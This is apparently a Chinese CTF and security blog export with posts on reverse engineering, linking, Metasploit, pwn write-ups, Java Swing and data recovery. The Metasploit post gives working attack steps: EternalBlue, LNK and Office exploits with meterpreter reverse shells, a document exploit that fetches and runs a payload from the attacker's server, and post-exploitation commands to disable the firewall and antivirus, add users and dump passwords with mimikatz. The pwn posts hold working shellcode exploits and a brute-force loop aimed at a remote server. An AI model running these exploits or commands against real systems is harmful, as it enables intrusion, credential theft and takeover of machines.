这里我是od一步一步分析的，还是耐心不够后来看师傅们的，发现都用爆破，这。。。。。(怪我代码能力弱了)还有一个可以看反编译？这很奇怪（原来是有花指令，导致ida不能反编译成伪代码)后来下来自己下来od手动去除伪代码（没有用的单字节去掉，不过伪代码有些东西类型，这只是一种）,可以f5后，也是要看大量的代码，佩服师傅们的能力，自己觉得od和ida结合是最好的这里也附上师傅们的wp12345678910111213141516171819202122import stringimport base64data = file(&apos;flag.enc&apos;).read().strip()data1 = &apos;&apos;for i in data: data1 += chr(ord(i)-0x10)data1 = data1.decode(&apos;hex&apos;)bd = base64.b64encode(data1)t1 = string.uppercase+string.lowercase+string.digits+r&apos;+/&apos;t2=&apos;&apos;for i in t1: t2 += chr(ord(i)-10)table1 = string.maketrans(t1,t2)table2 = string.maketrans(t2,t1)bd1 = bd.translate(table1)s=&apos;&apos;for i in range(len(bd1)/4): s += bd1[4*i]bd2 = s.translate(table2)n = 3-len(bd2)%3bd2 += &apos;=&apos;*nprint base64.b64decode(bd2)]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_Windows下IDA动态调试linux的ELF]]></title>
    <url>%2F2017%2F09%2F21%2Fre_elf_debugging%2F</url>
    <content type="text"><![CDATA[IDA真的好用 IDA动态调试linux的ELF1、准备在 IDA 的安装目录/dbgsrc/找到 linux_server 和 linux_serverx64 拷贝到 linux 虚拟机中 2、查看文件类型file elf如果是32位的运行./linux_server64位的运行./linux_serverx64 3、Windows设置1、Debugger –&gt;Remote Linux debugger2、Debugger –&gt;Process options –&gt; hostname 4、运行Linux下修改程序流程1、Linux下修改程序流程今天看见一个ctf的elf题目，很有趣，是一个dice题目，很熟悉嘛。今天有发现一种新套路，便记录下来，以后遇见就嘿嘿嘿 2、分析打开ida，发现如下前面生成随机数，后面验证，以往我都会改验证的地方，今天来点不一样的 3、修改发现flag在这个函数打印这个函数的地址是0x4006B6,同时发现main开始运行的 地址linux下gdb调试，在下断点,run运行i r 查看寄存器的值,此时，还没有运行到程序区n下一步，在i r查看发现已经到达程序区了，将rdi寄存器设置为我们想要的值 set $rdi=0x4006b6,运行c 程序员自我修养第4章——静态编译1、什么是静态编译静态编译，就是编译器在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.so或.lib)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖于动态链接库。 2、实验这里有a.c,b.c两个文件，如下:b.c12345int shared=1;void swap(int *a,int *b)&#123; *a^=*b^=*a^=*b;&#125; a.c123456extern int shared;int main()&#123; int a=100; swap(&amp;a,&amp;shared);&#125; 通过编译gcc -c a.c b.c产生a.o,b.o两个目标文件，接着我们准备把a.o,b.o文件合并ab文件。这里有两种方法。 一种是按序叠加(直接将一个文件加在另一个文件的尾，并依此合并)。一种是相似段合并(将相同性质的段合并到一起，如text段合并到text段)，又称为两步链接法。这里我们采用第二种方法进行链接(链接器为目标文件分配地址和空间) 第一步 空间与地址分配扫描所有的输入文件，获取他们的各个段的长度，属性和位置，并且将输入目标文件的符号表中所有的符号定义和符号引用收集起来，同意放到一个全局符号表，并建立映射关系。 第二步 符号解析与重定位使用上面收集的所有信息，读取输入文件中断的数据，重定位信息，并且进行符号解析与重定位，调整代码中的地址等。这一步中核心是重定位过程。我们使用ld链接器将a.o和b.o链接起来。ld a.o b.o -e main -o ab-e main 表示将main函数作为程序的入口地址，ld链接器默认的程序入口地址是_start.-o ab 表示链接输出文件名为ab，默认为a.out上图中VMA(Vitual Meemory Address)虚拟地址，LMA(load Memory Address)加载地址，正常情况下这两个是一样的，但是在一些嵌入式系统中，特别是在哪些程序放在ROM的系统中，它们是不同的。 符号地址的确定当完成前面一步时，链接器开始计算各个符号的虚拟地址，因为各个符号在段内的相对位置是固定的，所有这个时候main,shared的地址已经确认啦(只需要每一个符号加上一个偏移，就能找到正确的虚拟地址)。 符号解析和重定位重定位我们用objdump -d a.o可以看到shared的地址是0，因为这里不知道的位置。swap也是一样的。我们再看看abobjdunp -d ab发现链接后能正确的找到符号地址 重定位修正方法对于Intel x86处理器，有两种类型的处理器，分布的修正方法A = 保存在修正位置的值S = 符号的实际地址P = 被修正过的位置(相对于段开始的偏移量或是虚拟地址) 1、R_386_32 绝对寻址修正 S+A2、R_386_PC32 相对寻址修正 S+A-P]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSF渗透测试]]></title>
    <url>%2F2017%2F09%2F20%2Fmsf_17_010%2F</url>
    <content type="text"><![CDATA[ms17-010可谓一世英雄 ms17-010（smb 445）1、漏洞检测运行数据库service postgresql start启动msfconsolemsfconsole -q使用smb_ms17_010模块探测MS17-010漏洞use auxiliary/scanner/smb/smb_ms17_010set rhosts 192.168.1.134 2、把扫描结果进行ms17-010漏洞检测使用攻击模块use exploit/windows/smb/ms17_010_eternalblueoption（or info）查看参数set rhost 192.168.1.134这需要路由器开放端口，才能返弹set payload windows/x64/meterpreter/reverse_tcp这直接绑定set payload windows/x64/meterpreter/bind_tcprun运行 CVE-2017-8464（震网漏洞）插上U盘即中招12345use exploit/windows/fileformat/cve_2017_8464_lnk_rceset payload windows/x64/meterpreter/reverse_tcpset target 1set lhost 192.168.1.20exploit cp -r /root/.msf4/local/ /root/1 1234use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.1.20exploit -j 这里需要注意的是生成的必须放在U盘的根目录（因为需要驱动，坑好久才成功） CVE-2017-8570（office）只要接受者打开文本即中招链接：http://pan.baidu.com/s/1dF4J4PF 密码：vn0gpython cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.1.20/test.txt msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe &gt; shell.exe python cve-2017-8759_toolkit.py -M exp -e http://192.168.1.20/shell.exe -l shell.exe 1234use exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.1.20exploit -j meterpreter的基本命令1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid2.upload命令：可以上传文件或文件夹到目标机器upload /root/muma.py d:\\3.download命令：从目标机器上下载文件夹或者文件到攻击机download muma.py /root4.search命令：支持对远程目标机器上的文件进行搜索5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口portfwd add -l 3389 -r 10.21.13.225 -p 3389这条命令也可以开启3389远程桌面run post/windows/manage/enable_rdp或run getgui -e6.ps命令可以用来获取目标主机上正在运行的进程信息7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断migrate 10652(pid)8.execute命令：可以在目标机中执行文件execute -H -f cmd.exe9.关闭目标机器的防火墙netsh adcfirewall set allprofiles state off10.添加用户run getgui -u xxxxx -p xxxxx11.关闭杀毒软件run killav12.屏幕截图screenshot13.shell进入windows命令行，exit()回到meterpreter14.打开cmd命令行，看看已打开的端口netstat -ano15.测试是不是虚拟机run post/windows/gather/checkvm16.获取明文账号和密码load mimikatzkerberosmsv 远程连接mstsc]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_开始到开始]]></title>
    <url>%2F2017%2F09%2F20%2Fre_ctf_start%2F</url>
    <content type="text"><![CDATA[RE的一些基础,逆向题目，需要大胆猜测。接下来就是小心验证。 概述RE是逆向工程的简称（自己认为而已），逆向工程（又称逆向技术），是一种产品设计技术再现过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能特性及技术规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是在不能轻易获得必要的生产信息的情况下，直接从成品分析，推导出产品的设计原理。 工具1、IDA2、Ollydbg3、PEID 逆向工程入门学习（转载）汇编是逆向工程的基础，这篇文章讲解并不深入但是覆盖了你刚开始学习汇编需要了解的所有基础知识！汇编语言是一切程序的起点和终点，毕竟所有的高级语言都是建立在汇编基础之上的。在许多高级语言中我们都需要相对明确的语法，但是在汇编中，我们会使用一些单词缩写和数字来表达程序。 I. 单元、位和字节 1234567 ·BIT（位） - 电脑数据量的最小单元，可以是0或者1。例：00000001 = 1；00000010 = 2；00000011 = 3 ·BYTE（字节） - 一个字节包含8个位，所以一个字节最大值是255(0-255)。为了方便阅读，我们通常使用16进制来表示。·WORD（字） - 一个字由两个字节组成，共有16位。一个字的最大值是0FFFFh (或者是 65535d) (h代表16进制，d代表10进制)。·DOUBLE WORD（双字DWORD） - 一个双字包含两个字，共有32位。最大值为0FFFFFFFF (或者是 4294967295d)。·KILOBYTE（千字） - 千字节并不是1000个字节，而是1024 (32*32) 个字节。·MEGABYTE - 兆字节同样也不是一兆个字节，而是1024*1024=1,048,576 个字节 II. 寄存器 寄存器是计算机储存数据的“特别地方”。你可以把寄存器看作一个小盒子，我们可以在里面放很多东西：比如名字、数字、一段话……如今Win+Intel CPU组成的计算机通常有9个32位寄存器 (w/o 标志寄存器)。它们是：123456789EAX： 累加器EBX： 基址寄存器ECX： 计数器EDX： 数据寄存器ESI： 源变址寄存器EDI： 目的变址寄存器EBP： 扩展基址指针寄存器ESP： 栈指针寄存器EIP： 指令指针寄存器 通常来说寄存器大小都是32位 (四个字节) 。它们可以储存值为从0-FFFFFFFF (无符号)的数据。起初大部分寄存器的名字都暗示了它们的功能，比如ECX=计数，但是现在你可以使用任意寄存器进行计数 (只有在一些自定义的部分，计数才必须用到ECX)。当我用到EAX、EBX、ECX、EDX、ESI和EDI这些寄存器时我才会详细解释其功能，所以我们先讲EBP、ESP、EIP。123EBP： EBP在栈中运用最广，刚开始没有什么需要特别注意的 ;) ESP： ESP指向栈区域的栈顶位置。栈是一个存放即将会被用到的数据的地方，你可以去搜索一下push/pop 指令了解更多栈知识。 EIP： EIP指向下一个将会被执行的指令。 III. 标志寄存器标志寄存器代表某种状态。在32位CPU中有32个不同的标志寄存器，不过不用担心，我们只关心其中的3个：ZF、OF、CF。在逆向工程中，你了解了标志寄存器就能知道程序在这一步是否会跳转，标志寄存器就是一个标志，只能是0或者1，它们决定了是否要执行某个指令。 Z-Flag(零标志)： ZF是破解中用得最多的寄存器(通常情况下占了90%)，它可以设成0或者1。若上一个运算结果为0，则其值为1，否则其值为0。(你可能会问为什么‘CMP’可以操作ZF寄存器，这是因为该指令在做比较操作(等于、不等于)，那什么时候结果是0什么时候是1呢？待会再说) The O-Flag(溢出标志)： OF寄存器在逆向工程中大概占了4%，当上一步操作改变了某寄存器的最高有效位时，OF寄存器会被设置成1。例如：EAX的值为7FFFFFFFF，如果你此时再给EAX加1，OF寄存器就会被设置成1，因为此时EAX寄存器的最高有效位改变了(你可以使用电脑自带计算器将这个16进制转化成2进制看看)。还有当上一步操作产生溢出时(即算术运算超出了有符号数的表示范围)，OF寄存器也会被设置成1。The C-Flag(进位标志)：进位寄存器的使用大概占了1%，如果产生了溢出，就会被设置成1。例，假如某寄存器值为FFFFFFFF，再加上1就会产生溢出，你可以用电脑自带的计算器尝试。 IV. 段偏移内存中的一个段储存了指令(CS)、数据(DS)、堆栈(SS)或者其他段(ES)。每个段都有一个偏移量，在32位应用程序下，这些偏移量由 00000000 到 FFFFFFFF。段和偏移量的标准形式如下： 段：偏移量 = 把它们放在一起就是内存中一个具体的地址。 VI. 指令 (字母表排序)请注意，所有的值通常是以16进制形式储存的。 大部分指令有两个操作符 (例如：add EAX, EBX)，有些是一个操作符 (例如：not EAX)，还有一些是三个操作符 (例如：IMUL EAX、EDX、64)。如果你使用 “DWORD PTR [XXX]”就表示使用了内存中偏移量为[XXX]的的数据。注意：字节在内存中储存方式是倒过来的(Win+Intel的电脑上大部分采用”小端法”， WORD PTR XXX和 BYTE PTR XXX也都遵循这一规定)。 大部分有两个操作符的指令都是以下这些形式（以add指令举例）：1234567891011add eax,ebx ;; 寄存器, 寄存器add eax,123 ;; 寄存器, 数值add eax,dword ptr [404000] ;; 寄存器, Dword 指针 [数值]add eax,dword ptr [eax] ;; 寄存器, Dword 指针 [寄存器值]add eax,dword ptr [eax+00404000] ;; 寄存器, Dword 指针 [寄存器值+数值]add dword ptr [404000],eax ;; Dword 指针[数值], 寄存器add dword ptr [404000],123 ;; Dword 指针[数值], 数值add dword ptr [eax],eax ;; Dword 指针[寄存器值], 寄存器add dword ptr [eax],123 ;; Dword 指针[寄存器值], 数值add dword ptr [eax+404000],eax ;; Dword 指针[寄存器值+数值], 寄存器add dword ptr [eax+404000],123 ;; Dword 指针[寄存器值+数值], 数值 深入的必经之路PE（Portable Executable）文件简介PE（Portable Executable）文件是Windows操作系统下使用的可执行文件格式。它是微软在UNIX平台的COFF（通用对象文件格式）基础上制作而成。最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在Windows系列操作系统下。PE文件是指32位可执行文件，也称为PE32。64位的可执行文件称为PE+或PE32+,是PE(PE32)的一种扩展形式（请注意不是PE64)。PE文件结构一般如上图所示。当一个PE文件被执行时，PE装载器首先检查DOS header里的PE header的偏移量。如果找到，则直接跳转到PE header的位置。 当PE装载器跳转到PE header后，第二步要做的就是检查PE header是否有效。如果该PE header有效，就跳转到PE header的尾部。 紧跟PE header尾部的是节表。PE装载器执行完第二步后开始读取节表中的节段信息，并采用文件映射（在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射的机制，也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系，只有真正执行到某个内存页中的指令或者访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大的关系）的方法将这些节段映射到内存，同时附上节表里指定节段的读写属性。 PE文件映射入内存后，PE装载器将继续处理PE文件中类似 import table （输入表）的逻辑部分这四个步骤便是PE文件的执行顺序，具体细节读者可以参考相关文档。 学习途径练习https://github.com/scwuaptx/HITCON-Traininghttps://www.jarvisoj.com/challengeshttps://betamao.me/challengeshttp://ctf.nuptzj.cn/challenges# 各种论坛看雪 www.pediy.com吾爱破解 www.52pojie.cn 推荐书籍:逆向工程核心原理加密与解密IDA Pro权威指南（第2版）C++反汇编与逆向分析技术揭秘 只想说，需要耐心。多百度,多逛博客，多认识点大师傅]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PWN——CTF中的简单ret2blic]]></title>
    <url>%2F2017%2F09%2F19%2Fpwn2%2F</url>
    <content type="text"><![CDATA[某平台上的一道题 1、ret2blic1、何为ret2blic通过返回地址或者函数的plt跳到我们需要执行的函数，从而达到我们想要的，一般都是得到shell 2、源码123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;char *shell = "/bin/sh";void grant() &#123; system("Good job");&#125;void exploitable() &#123; char buffer[16]; scanf("%s", buffer); if(strcmp(buffer,"pwned") == 0) grant(); else puts("Nice try\n");&#125;int main()&#123; exploitable(); return 0;&#125; 运行命令生成gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn1 pwn1.c 3、漏洞原理，利用ret2blic技术ida打开，查看grant函数 汇编代码如下123456789101112131415161718192021.text:080484CB grant proc near ; CODE XREF: .text:080484CB.text:080484CB var_4 = dword ptr -4.text:080484CB.text:080484CB push ebp.text:080484CC mov ebp, esp.text:080484CE push ebx.text:080484CF sub esp, 4.text:080484D2 call __x86_get_pc_thunk_ax.text:080484D7 add eax, 1B29h.text:080484DC sub esp, 0Ch.text:080484DF lea edx, (aGoodJob - 804A000h)[eax] ; "Good job".text:080484E5 push edx ; command.text:080484E6 mov ebx, eax.text:080484E8 call _system.text:080484ED add esp, 10h.text:080484F0 nop.text:080484F1 mov ebx, [ebp+var_4].text:080484F4 leave.text:080484F5 retn.text:080484F5 grant endp 这里可以理解为system(command)最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。而我们想要得到shell，就得将command改为“bin/sh”，即system(&quot;bin/sh&quot;) 从ida我们看到“/bin/sh”的地址0x8048610123456.rodata:08048610 aBinSh db '/bin/sh',0 ; DATA XREF: ..rodata:08048618 aGoodJob db 'Good job',0 ; DATA XREF: .rodata:08048621 aS db '%s',0 ; DATA XREF: .rodata:08048624 aPwned db 'pwned',0 ; DATA XREF: .rodata:0804862A aNiceTry db 'Nice try',0Ah,0 ; DATA XREF: .rodata:0804862A _rodata ends 从ida我们看到system_plt的地址0x80483901234.plt:08048390 ; int system(const char *command).plt:08048390 _system proc near ; CODE XREF: .plt:08048390 jmp ds:off_804A014.plt:08048390 _system endp 我们构造一个“假”的堆栈结构，然后修改函数的返回地址: payload=&#39;a&#39;*28+p32(system_plt)+p32(1)+p32(sh_addr) p32(system_plt):原函数的返回地址，这里改为我们要执行的system的地址p32(1):system的返回地址，因为用不到，这里我随便填的。p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址 4、exp12345678from pwn import *p = process('./pwn1')#gdb.attach(p,'''break main''')system_plt=0x8048390sh_addr=0x8048610payload='a'*28+p32(system_plt)+p32(1)+p32(sh_addr)p.sendline(payload)p.interactive() 记录一下字节走的坑：后面发现system_plt等等许多plt是不能用ida看到出来的,上面也许是巧合要写会用system_plt=elf.symbols[‘system’] 5、改善的exp12345678from pwn import *p = process('./pwn1')elf = ELF('pwn1')system_plt=elf.symbols['system']sh_addr=0x8048610payload='a'*28+p32(system_plt)+p32(1)+p32(sh_addr)p.sendline(payload)p.interactive() 2、整数溢出1、整数溢出整数溢出就是往存储整数的内存单位存放的数据大于该内存单位所能存储的最大值,整数溢出有时候间接导致缓冲区溢出。 2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）题目：链接：http://pan.baidu.com/s/1nuU9pO1 密码：e7ue123456789101112131415161718192021222324#include#include#includevoid flow(char* input)&#123; char passwd_buf[11]; unsigned char passwd_len = strlen(input); if(passwd_len&gt;=4&amp;&amp;passwd_len&lt;=8) &#123; printf("Valid Password\n"); strcpy(passwd_buf,input); &#125; else&#123; printf("Invalid Password\n"); &#125;&#125;int main()&#123; char input[1024]; gets(input); flow(input); return 0;&#125; 3、分析 先file pwn0,发现为32位,checksec pwn0并且没有开NX,用ida打开，如下 发现栈空间为14h,这里是无符号接受判断输入的字符个数，也就是当超过256,个字符又会循环。即257为1，根据题目 判断输入字符4~8个，即261=5，构造261位，既可以绕过检测，又为我们提供了栈空间 由于已经知道那个函数的栈空间14h,那么函数的返回地址即为18h,但是我们的shellcode是大于18h的，所以放在18h的后面，payload如下： payload =&#39;a&#39;*24 + ret + shellcode 现在我们找到ret的地址，即是shellcode的起始地址（shellcode可以自己生成），这我…一言难尽 调试，找到shellcode的起始地址 改变返回地址 ret = 0xffffcf80 运行 成功！ 然而，并没有做过pwn题的我来说，我就直接运行，悲剧发生了 原来要在本地跑运行，然后 核心转存，用生成的coredump来调试 核心转存配置： 12ulimit -c unlimitedecho /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern 这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。 12cat /proc/sys/kernel/randomize_va_spaceecho 0 &gt; /proc/sys/kernel/randomize_va_space 本地运行： socat tcp-l:4000,fork exec:./pwn0 本地生成core.pwn0.2684文件,调试core.pwn0.2684文件 gdb pwn0 core.pwn0.2684 如图： 本地测试运行成功，连上目标机器，就不能成功，可能是libc.so.6不同 exp: 1234567from pwn import *shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";p = remote('115.159.26.117',4000)ret = 0xffffced0payload = 'b'*24+p32(ret)+shellcode+'a'*(261-28-len(shellcode))p.sendline(payload)p.interactive() 这里我先用一个循环脚本写找到那个shellcode的地址，在代入exp：1234567891011121314151617181920212223242526272829303132333435363738from pwn import *shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";'''c=[]for i in range(1000): p = remote('115.159.26.117',4000) ret = 0xffffcea0+i payload = 'b'*24+p32(ret)+shellcode+'a'*(261-28-len(shellcode)) p.sendline(payload) try: print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print p.recv(timeout=0.1) print i c.append(i) except: p.close() passp.interactive()print c'''p = remote('115.159.26.117',4000)ret = 0xffffcea0+848payload = 'b'*24+p32(ret)+shellcode+'a'*(261-28-len(shellcode))p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于JAVA图形化界面的云端]]></title>
    <url>%2F2017%2F09%2F19%2Fmisc_java_swing%2F</url>
    <content type="text"><![CDATA[基于JAVA图形化界面的云端，JAVA云端实现 JAVA云端实现1、概念 swing图形化界面继承来自AWT图形化界面1、Swing 是一个为Java设计的GUI工具包。Swing是JAVA基础类的一部分。Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为 。 2、了解Java swing 结构 Swing组件可以分成两种类型，一种是JComponent类，另一种是Window类。两者的区别是JComponent组件类主要包括一些不能独立显示的组件（即必须依赖于中间容器才能显示），而Window组件类主要包括了一些可以独立显示的组件。 JFrame – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。JPanel – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。。JLabel – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。JTextField –一个轻量级组件，它允许编辑单行文本。JPasswordField – 允许我们输入了一行字像输入框，但隐藏星号(*) 或点创建密码(密码) 最后，直接上代码模型，这是我项目的部分，贴出来大家可以参考百度链接: http://pan.baidu.com/s/1qY4tVuk密码： 6qp5 数据恢复数据恢复分类：硬恢复和软恢复。 一、硬恢复所谓硬恢复就是硬盘出现物理性损伤，比如有盘体坏道、电路板芯片烧毁、盘体异响等故障，由此所导致的普通用户不容易取出里面数据，那么我们将它修好，同时又保留里面的数据或后来恢复里面的数据，这些都叫数据恢复，只不过这些故障有容易的和困难的之分。 二、软恢复所谓软恢复，就是硬盘本身没有物理损伤，而是由于人为或者病毒破坏所造成的数据丢失（比如误格式化，误分区），那么这样的数据恢复就叫软恢复。 1、FATFAT文件系统的基本结构依次为：DBR扇区、FAT表1、FAT表2、根目录和数据区。如图:我们可以用winhex工具来打开一个SD卡(磁盘，这里可以用RAMDisk来创建一个虚拟磁盘)，如图:这里可以根据模板来看每个字节代表的意思(如果不能使用模板，那就还没有激活，这里附带全部工具。链接：https://pan.baidu.com/s/1AheJMibnDhikoUVZrqIgDg 密码：7hyd)。 2、文件恢复使用WinHex 恢复被破坏的文件用winhex打开磁盘，选择磁盘快照，然后创建一个文件，再删除文件，再次用winhex打开磁盘，就会发现刚才删除的文件，选择恢复文件(为了避免数据丢失，应该恢复到其他磁盘)，再次打开文件，发现文件恢复。如下图演示:接着测试NTFS的磁盘，发现并不不能恢复，呀呀呀呀（可能是自己太菜啦）。然后在网上找一下，发现一个恢复文件的工具很好用，专业还是专业的好，我就了解一下，好好学习。http://www.jjhuifu.com/jj/brj.html]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[搬家啦]]></title>
    <url>%2F2017%2F09%2F18%2Fpwn0%2F</url>
    <content type="text"><![CDATA[以前一直在网站写学习经历，突然发现不如自己写blog，而且自己很方便，就搬过来啦。这里先记录一下我在0day看了的一篇——缓冲区溢出 1、栈溢出1、缓冲区溢出 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。这里利用C语言不判断数组越界做缓冲区溢出。 2、源代码1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;String.h&gt;# define passwd "9234567"int func_A(char *password)&#123; int a; a = strcmp(password,passwd); return a;&#125;int main (int argc,char **argv,char **envp)&#123; int flag = 0; char password[16]; while(1) &#123; printf("password:"); scanf("%s",password); flag = func_A(password); if(flag) &#123; printf("error!!\n"); &#125;else &#123; printf("sccess!!\n"); break; &#125;&#125;&#125; 这是一个简单验证密码的函数。我们先了解它的栈。 这里解释一下栈的机制：栈是以EBP为基址(栈底)，ESP为栈顶。从高地址使用栈，逐渐向低地址扩散。 下图为现在栈的情况： 3、缓冲区溢出代码123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;String.h&gt;# define passwd "1234567"int func_A(char *password)&#123; int a; char b[8]; //用于缓冲区溢出 a = strcmp(password,passwd); strcpy(b,password); //这里缓冲区溢出 return a;&#125;int main (int argc,char **argv,char **envp)&#123; int flag = 0; char password[16]; while(1) &#123; printf("password:"); scanf("%s",password); flag = func_A(password); if(flag) &#123; printf("error!!\n"); &#125;else &#123; printf("sccess!!\n"); break; &#125;&#125;&#125; 这里覆盖a的值，从而达到绕过验证。同样来看看代码的栈情况 如何溢出的，我们来看看如下情况： 这是因为C语言没有判断数组越界的情况，当传入func_A()函数的字节超过8字节时，就会产生溢出，覆盖高地址的值（包括返回地址，这里就可以做很多事的。。）。 程序采用小端序，如果输入的值大于验证的值，a=1;而我们输入8字节，程序字符串都是以null结束的。这时null就会覆盖a的值，使其为null(0); 输入:23456789 就会:sccess 如果输入的值小于验证的值，a=-1（0xFFFFFFFF）;而我们输入11字节(比如12345670000)，这时null就会覆盖a的值，使其为000;但是并没有成功开始不理解，后来发现为什么啦，这里就留给读者思考吧。思考使我快乐… 程序很简单，可以自己动手做做。主要理解栈溢出的原理，为以后打好基础。 2、栈溢出——控制流劫持1、原理通过覆盖返回地址，让程序执行我们想要执行的位置（任意地址）,包括我们构造的shellcode，从而得到shell换个姿势理解： https://esebanana.github.io/2017/09/14/window-hexo/ 2、源码福利123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123;puts("You Hava already controlled it.");system("/bin/sh");&#125;void vulnerable() &#123;char s[12];gets(s);puts(s);return;&#125;int main(int argc, char **argv) &#123;vulnerable();return 0;&#125; 3、命令编译程序生成stack1.exe文件gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX 4、分析使用ida打开，发现如下: 这里就可以覆盖返回地址构造溢出 5、写exp这里可以安装pwntools，这是一个很好用的工具git clone https://github.com/Gallopsled/pwntoolscd pwntoolspython setup.py install调试可以用gdb,可以安装插件pedagit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit exp:123456789from pwn import *p = process('./stack1')payload = 'A'*24 + p32(0x804846B)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
</search>
